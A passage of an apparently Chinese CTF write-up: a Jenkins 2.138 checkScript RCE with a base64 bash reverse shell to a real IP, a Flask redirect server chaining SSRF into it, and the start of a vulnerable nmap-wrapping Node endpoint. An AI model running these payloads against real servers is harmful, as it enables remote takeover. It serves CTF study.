class="string">&quot;page-body&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;clear&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;side-panel&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;tasks&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;task&quot;</span>&gt;&lt;a href=<span class="string">&quot;/asynchPeople/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-icon-link&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/24x24/user.png&quot;</span> style=<span class="string">&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-user icon-md&quot;</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">&quot;/asynchPeople/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-link&quot;</span>&gt;People&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;task&quot;</span>&gt;&lt;a href=<span class="string">&quot;/view/all/builds&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-icon-link&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/24x24/notepad.png&quot;</span> style=<span class="string">&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-notepad icon-md&quot;</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">&quot;/view/all/builds&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-link&quot;</span>&gt;Build History&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;task&quot;</span>&gt;&lt;a href=<span class="string">&quot;/credentials&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-icon-link&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/plugin/credentials/images/24x24/credentials.png&quot;</span> style=<span class="string">&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-credentials-credentials icon-md&quot;</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">&quot;/credentials&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-link&quot;</span>&gt;Credentials&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;buildQueue&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;container-fluid pane-frame track-mouse expanded&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;col-xs-24 pane-header&quot;</span>&gt;&lt;a href=<span class="string">&quot;/toggleCollapse?paneId=buildQueue&quot;</span> title=<span class="string">&quot;collapse&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;collapse&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/16x16/collapse.png&quot;</span> alt=<span class="string">&quot;collapse&quot;</span> style=<span class="string">&quot;width: 16px; height: 16px; &quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-collapse icon-sm&quot;</span> /&gt;&lt;/a&gt;Build Queue&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row pane-content&quot;</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">&quot;pane &quot;</span>&gt;&lt;script src=<span class="string">&#x27;/adjuncts/e1c81722/lib/form/link/link.js&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;&lt;/script&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span> colspan=<span class="string">&quot;2&quot;</span>&gt;No builds <span class="keyword">in</span> the queue.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">&quot;defer&quot;</span>&gt;refreshPart(<span class="string">&#x27;buildQueue&#x27;</span>,<span class="string">&quot;/ajaxBuildQueue&quot;</span>);&lt;/script&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;executors&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;container-fluid pane-frame track-mouse expanded&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;col-xs-24 pane-header&quot;</span>&gt;&lt;a href=<span class="string">&quot;/toggleCollapse?paneId=executors&quot;</span> title=<span class="string">&quot;collapse&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;collapse&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/16x16/collapse.png&quot;</span> alt=<span class="string">&quot;collapse&quot;</span> style=<span class="string">&quot;width: 16px; height: 16px; &quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-collapse icon-sm&quot;</span> /&gt;&lt;/a&gt;&lt;a href=<span class="string">&#x27;/computer/&#x27;</span>&gt;Build Executor Status&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row pane-content&quot;</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">&quot;pane &quot;</span>&gt;&lt;colgroup&gt;&lt;col width=<span class="string">&quot;30&quot;</span> /&gt;&lt;col width=<span class="string">&quot;200*&quot;</span> /&gt;&lt;col width=<span class="string">&quot;24&quot;</span> /&gt;&lt;/colgroup&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span> align=<span class="string">&quot;right&quot;</span> style=<span class="string">&quot;vertical-align: top&quot;</span>&gt;<span class="number">1</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span> align=<span class="string">&quot;right&quot;</span> style=<span class="string">&quot;vertical-align: top&quot;</span>&gt;<span class="number">2</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">&quot;defer&quot;</span>&gt;refreshPart(<span class="string">&#x27;executors&#x27;</span>,<span class="string">&quot;/ajaxExecutors&quot;</span>);&lt;/script&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;main-panel&quot;</span>&gt;&lt;a name=<span class="string">&quot;skip</span></span><br></pre></td></tr></table></figure><p>看到 jenkins 版本为 2.138, 别问👴怎么看到的，你咋那么多事呢😡</p><p><a href="https://www.cnblogs.com/cute-puli/p/15378440.html">https://www.cnblogs.com/cute-puli/p/15378440.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%<span class="number">20</span><span class="keyword">class</span>%20x%<span class="number">20</span>&#123;public%20x()&#123;%<span class="number">22</span>命令替换%<span class="number">22.</span>execute()&#125;&#125;</span><br></pre></td></tr></table></figure><p>打这个命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public <span class="keyword">class</span> <span class="title class_">x</span> &#123;public x()&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>.execute()&#125;&#125;</span><br></pre></td></tr></table></figure><p>先把 value 的值 url 编码，然后把整个重定向网址 url 编码，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">63</span>%6c%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">20</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">28</span>%<span class="number">29</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">20</span>%2d%<span class="number">63</span>%<span class="number">20</span>%7b%<span class="number">65</span>%<span class="number">63</span>%<span class="number">68</span>%6f%2c%<span class="number">59</span>%6d%<span class="number">46</span>%7a%<span class="number">61</span>%<span class="number">43</span>%<span class="number">41</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">53</span>%<span class="number">41</span>%2b%4a%<span class="number">69</span>%<span class="number">41</span>%<span class="number">76</span>%5a%<span class="number">47</span>%<span class="number">56</span>%<span class="number">32</span>%4c%<span class="number">33</span>%<span class="number">52</span>%6a%<span class="number">63</span>%<span class="number">43</span>%<span class="number">38</span>%<span class="number">30</span>%4d%<span class="number">79</span>%<span class="number">34</span>%<span class="number">78</span>%4e%<span class="number">44</span>%4d%<span class="number">75</span>%4d%<span class="number">54</span>%6b%<span class="number">79</span>%4c%6a%<span class="number">45</span>%<span class="number">35</span>%4c%7a%<span class="number">45</span>%<span class="number">78</span>%4e%<span class="number">44</span>%<span class="number">55</span>%<span class="number">67</span>%4d%<span class="number">44</span>%<span class="number">34</span>%6d%4d%<span class="number">51</span>%3d%3d%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%2c%2d%<span class="number">64</span>%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%2c%2d%<span class="number">69</span>%7d%<span class="number">22</span>%2e%<span class="number">65</span>%<span class="number">78</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">28</span>%<span class="number">29</span>%0a%<span class="number">20</span>%<span class="number">20</span>%7d%0a%7d</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">68</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">70</span>%3a%2f%2f%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%3a%<span class="number">38</span>%<span class="number">30</span>%<span class="number">38</span>%<span class="number">30</span>%2f%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">52</span>%<span class="number">65</span>%<span class="number">61</span>%6c%6d%2f%<span class="number">75</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%2f%<span class="number">61</span>%<span class="number">64</span>%6d%<span class="number">69</span>%6e%2f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%6f%<span class="number">72</span>%<span class="number">42</span>%<span class="number">79</span>%4e%<span class="number">61</span>%6d%<span class="number">65</span>%2f%6f%<span class="number">72</span>%<span class="number">67</span>%2e%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">69</span>%2e%<span class="number">70</span>%6c%<span class="number">75</span>%<span class="number">67</span>%<span class="number">69</span>%6e%<span class="number">73</span>%2e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%2e%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%2e%<span class="number">67</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%2e%<span class="number">53</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">47</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%2f%<span class="number">63</span>%<span class="number">68</span>%<span class="number">65</span>%<span class="number">63</span>%6b%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3f%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%3d%<span class="number">74</span>%<span class="number">72</span>%<span class="number">75</span>%<span class="number">65</span>%<span class="number">26</span>%<span class="number">76</span>%<span class="number">61</span>%6c%<span class="number">75</span>%<span class="number">65</span>%3d%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span></span><br></pre></td></tr></table></figure><p>最终 exp,👴の最後のエクスプロイト (exloit)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/evil&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://124.70.33.170:8088/redirect?redirect_url=%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3dquot;</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031083826.png" alt="微信截图_20231031083826"></p><p>哈哈哈哈哈！欺骗世界这种事情，对于👴来说，简直小菜一碟.</p><p>わたしは強い　あなたたちより強い！</p><p>这一切都是命运石之门的选择！</p><h1 id="~ave-mujicas-masquerade~"><span id="~ave-mujicas-masquerade~"> ~Ave Mujica’s Masquerade~</span></h1><p>「お幸せに」, 希啊哇赛你妹的，👴很😡😡.</p><h2 id="源码冲"><span id="源码冲"> 源码，冲😓</span></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/checker&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url = req.<span class="property">query</span>.<span class="property">url</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (url) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> host;</span><br><span class="line">    <span class="keyword">let</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MakE it Safer!!!!! </span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="title function_">includes</span>(<span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">const</span> parts = url.<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">      host = parts[<span class="number">0</span>];</span><br><span class="line">      port = parts.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      host = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (port) &#123;</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, port, host]); <span class="comment">// Construct the shell command</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="string">&quot;80&quot;</span>, host]);</span><br><span class="line">    &#125;</span><br><span class="line">    nmap = <span class="title function_">spawn</span>(<span class="string">&quot;bash&quot;</span>, [<span class="string">&quot;-c&quot;</span>, command]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(command);</span><br><span class="line">    </span><br><span class="line">    nmap.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;child process exited with code &#x27;</span> + code.<span class="title function_">toString</span>());</span><br><span 